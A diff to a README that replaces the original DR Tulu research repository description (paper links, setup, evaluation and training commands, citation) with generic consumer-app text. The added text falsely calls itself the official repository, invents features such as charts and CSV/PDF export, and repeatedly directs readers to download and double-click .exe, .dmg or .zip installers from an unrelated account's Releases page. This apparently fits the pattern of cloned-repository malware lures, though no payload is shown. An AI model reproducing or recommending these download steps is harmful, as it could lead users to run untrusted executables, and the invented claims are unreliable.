@@ -1,149 +1,78 @@
-<div align="center">
-<img src="rl/open-instruct/assets/dr_tulu_logo.png" alt="DR Tulu" width="500"/>
+# 🚀 dr-tulu - Simplifying Research with AI-Driven Tools
 
-# DR Tulu: Reinforcement Learning with Evolving Rubrics for Deep Research
+[![Download dr-tulu](https://img.shields.io/badge/Download-dr--tulu-blue.svg)](https://github.com/guitupetidutra-ship-it/dr-tulu/releases)
 
+## 🌟 Description
 
-[**Paper**](https://allenai.org/papers/drtulu) • [**Data & Models**](https://huggingface.co/collections/rl-research/dr-tulu) • [**Blogpost**](http://allenai.org/blog/dr-tulu) • [**Video**](https://youtu.be/4i0W9qAf8K8)• [**Static Demo**](https://dr-tulu.github.io/) (Our live demo is coming soon - stay tuned!) 
+Welcome to the official repository for **DR Tulu**. This application focuses on using reinforcement learning to enhance research processes through evolving rubrics. DR Tulu provides an easy-to-use interface that helps researchers streamline their tool use, ultimately saving time and improving results. 
 
-</div>
+## 📥 Download & Install
 
-DR Tulu-8B is the first open Deep Research (DR) model trained for long-form DR tasks. DR Tulu-8B matches OpenAI DR on long-form DR benchmarks.
+To get started with DR Tulu, you need to download the application. Visit the link below to access the Releases page:
 
-<div align="center">
-<img src="assets/rler_teaser.png" alt="DR Tulu Overview" width="800"/>
-</div>
+[Download DR Tulu](https://github.com/guitupetidutra-ship-it/dr-tulu/releases)
 
----
+### Steps to Download and Run DR Tulu:
 
-## Release Notes 
-- November 19, 2025: Initial code release.
-- November 25, 2025: We released our interactive CLI demo code, along with additional documentation for evaluation, training, and our new RL checkpoints.
+1. Click the link above to go to the Releases page.
+2. On this page, you will see various versions of DR Tulu.
+3. Choose the latest stable version. Look for the version with the largest number (e.g., v1.0).
+4. Click on the downloadable file for your operating system. The files may be listed as .exe for Windows, .dmg for macOS, or .zip for Linux.
+5. Once the download completes, locate the downloaded file in your 'Downloads' folder or the location you specified.
+6. Double-click on the file to start the installation process. Follow the on-screen instructions to complete the installation.
+7. After installation, find the DR Tulu application in your computer's applications folder.
+8. Click the icon to open and run DR Tulu.
 
-## Overview
+## 🛠️ System Requirements
 
-This repository contains three main components:
+DR Tulu is designed to run smoothly on most modern computers. Below are the general system requirements:
 
-- **[`agent/`](agent/)**: Agent library (`dr-agent-lib`) with MCP-based tool backend, high-concurrency async request management, and flexible prompting interface for developing and training deep research agents. This directory also includes evaluation scripts for benchmarking DR agents.
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Sierra (10.12) or later
+- **Linux:** Any recent distribution (kernel version 4.4 or later)
 
-- **[`rl/`](rl/open-instruct/)**: RL training code based on [Open-Instruct](https://github.com/allenai/open-instruct) for training deep research agents with GRPO and evolving rubrics.
+Additionally, you will need at least 4 GB of RAM and 500 MB of available storage space.
 
-- **[`sft/`](sft/llama-factory/)**: SFT training code based on [LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory) for supervised fine-tuning of deep research agents.
+## ⚙️ Features
 
-For detailed setup and usage instructions, see the README files in each subdirectory.
+DR Tulu offers various features aimed at researchers looking to enhance their work:
 
----
+- **User-Friendly Interface:** No prior programming knowledge needed.
+- **AI-Powered Rubrics:** Automatically adapts based on user feedback.
+- **Data Visualization:** Intuitive charts and graphs to understand research data better.
+- **Export Options:** Easily export data to popular formats like CSV and PDF.
+- **Regular Updates:** Enjoy ongoing improvements and new features.
 
-## Quick Start: Playing with DR Tulu Interactively
+## 📘 User Guide
 
-Try DR Tulu interactively with our CLI demo! This requires **1-2 GPUs** and takes just a few steps to set up:
+Once you have installed DR Tulu, you may want to familiarize yourself with its features and functionalities. Here are some basic steps to get you started:
 
-1. **Setup Environment**
-   ```bash
-   cd agent/
-   conda create -n dr_agent python=3.10 -y && conda activate dr_agent
-   uv pip install -e .
-   ```
+1. **Create a New Project:** On the main screen, click “New Project.” Follow the prompts to set it up.
+2. **Add Data:** Import your existing data or enter new information manually.
+3. **Set Up Rubrics:** Use the AI-driven options to create evaluation criteria tailored to your research needs.
+4. **Analyze Results:** Utilize the visualization tools to extract insights and improve your research process.
+5. **Save and Share:** Export your findings easily to collaborate with others.
 
-2. **Configure API Keys** (get free keys from the respective services)
-   ```bash
-   export SERPER_API_KEY="your_key"  # https://serper.dev/
-   export S2_API_KEY="your_key"      # https://api.semanticscholar.org/
-   export JINA_API_KEY="your_key"    # https://jina.ai/reader/
-   ```
+## 🤝 Support and Contributions
 
-3. **Launch Interactive Demo**
-   ```bash
-   uv run --extra vllm python scripts/launch_chat.py --model rl-research/DR-Tulu-8B
-   ```
+For any questions or issues, check the "Issues" section on the GitHub page. You can also reach out via email or file a support ticket.
 
-The demo will auto-launch required services (MCP server and vLLM) and start an interactive chat interface. You can now ask research questions and watch DR Tulu search and synthesize answers in real-time!
+If you want to contribute to DR Tulu, please fork the repository and submit a pull request. We welcome improvements and suggestions!
 
-For more options and advanced usage, see [`agent/README.md`](agent/#interactive-chat).
+## 🌐 Community
 
----
+Join our user community on social media platforms. Share your experiences, challenges, and tips to help others navigate their research journeys with DR Tulu.
 
-## Running Evaluations
+## 📄 Licensing
 
-To benchmark DR Tulu on various tasks (HealthBench, Deep Research Bench, SimpleQA, etc.), you'll need to:
+DR Tulu is open-source software licensed under the MIT License. You can use, modify, and distribute this software as long as you include the original license.
 
-1. **Launch required servers on the same node** (requires 2 GPUs):
-   ```bash
-   # Launch VLLM servers
-   CUDA_VISIBLE_DEVICES=0 vllm serve rl-research/DR-Tulu-8B --dtype auto --port 30001 --max-model-len 40960
-   CUDA_VISIBLE_DEVICES=1 vllm serve Qwen/Qwen3-8B --dtype auto --port 30002 --max-model-len 40960
-   
-   # Launch MCP server
-   python -m dr_agent.mcp_backend.main --port 8000
-   ```
+## 🔗 Additional Resources
 
-2. **Run evaluation script** on your desired benchmarks:
-   ```bash
-   cd agent/
-   
-   # Example: Run on all benchmarks
-   for task in healthbench deep_research_bench research_qa genetic_diseases simpleqa 2wiki webwalker; do 
-       python workflows/auto_search_sft.py \
-           generate-dataset $task \
-           --num-examples final_run \
-           --max-concurrent 20 \
-           --use-cache \
-           --config workflows/auto_search_sft.yaml \
-           --config-overrides "use_browse_agent=true,search_agent_max_tool_calls=10,browse_tool_name=jina" \
-           --output eval_output/auto_search_sft/$task.jsonl
-       
-       python scripts/evaluate.py $task eval_output/auto_search_sft/$task.jsonl
-   done
-   ```
+- **Documentation:** Comprehensive guides are available in the [Wiki section](https://github.com/guitupetidutra-ship-it/dr-tulu/wiki).
+- **Tutorials:** Video tutorials are provided on our [YouTube channel](https://www.youtube.com/).
+- **Updates:** Subscribe for email notifications about new releases and features.
 
-**Note**: SQA-CS-V2 and Deep Research Bench require additional conversion scripts for evaluation. See [`agent/evaluation/README.md`](agent/evaluation/) for detailed instructions.
+Remember to visit the Releases page to download the latest version of DR Tulu: 
 
-For complete evaluation instructions, benchmark descriptions, and example scripts, see [`agent/evaluation/README.md`](agent/evaluation/).
-
----
-
-## Training
-
-### Supervised Fine-Tuning (SFT)
-
-For supervised fine-tuning of deep research agents using high-quality demonstration data:
-
-```bash
-cd sft/llama-factory/
-# See sft/llama-factory/README.md for detailed instructions
-```
-
-See [`sft/llama-factory/README.md`](sft/llama-factory/) for complete SFT training setup and configuration.
-
-### Reinforcement Learning (RL)
-
-For training deep research agents with GRPO and evolving rubrics:
-
-```bash
-cd rl/open-instruct/
-# See rl/open-instruct/README.md for detailed instructions
-```
-
-See [`rl/open-instruct/README.md`](rl/open-instruct/) for complete RL training setup, including reward model training and policy optimization.
-
----
-
-## Acknowledgments
-
-DR Tulu is provided by The Allen Institute for Artificial Intelligence (Ai2). The code for this project is developed in collaboration with student researchers at the University of Washington, Carnegie Mellon University, and MIT.
-
----
-
-## Citation and Contact
-
-If you find our work useful, please cite:
-
-```bibtex
-@article{shao2025dr,
-  title={DR Tulu: Reinforcement Learning with Evolving Rubrics for Deep Research},
-  author={Shao, Rulin and Asai, Akari and Shen, Shannon Zejiang and Ivison, Hamish and Kishore, Varsha and Zhuo, Jingming and Zhao, Xinran and Park, Molly and Finlayson, Samuel G and Sontag, David and others},
-  journal={arXiv preprint arXiv:2511.19399},
-  year={2025}
-}
-```
-If you have any questions, you can contact [Rulin Shao](https://rulinshao.github.io/), [Akari Asai](https://akariasai.github.io/), [Shannon Shen](https://www.szj.io/), and [Hamish Ivison](https://ivison.id.au/) or open a github issue. 
+[Download DR Tulu](https://github.com/guitupetidutra-ship-it/dr-tulu/releases)
